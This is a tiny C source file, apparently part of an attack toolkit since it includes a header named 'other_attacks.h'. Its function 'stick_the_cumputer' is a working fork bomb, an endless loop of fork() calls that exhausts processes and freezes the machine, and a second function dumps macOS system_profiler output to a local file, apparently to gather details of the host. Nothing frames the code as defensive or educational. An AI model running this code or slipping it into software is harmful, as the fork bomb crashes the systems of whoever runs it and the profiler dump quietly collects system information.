#include "other_attacks.h"

void stick_the_cumputer(){
	while(1)
		fork();
}

void get_system_profiler(){
	system("system_profiler -detailLevel mini > system_profiler.txt");
}
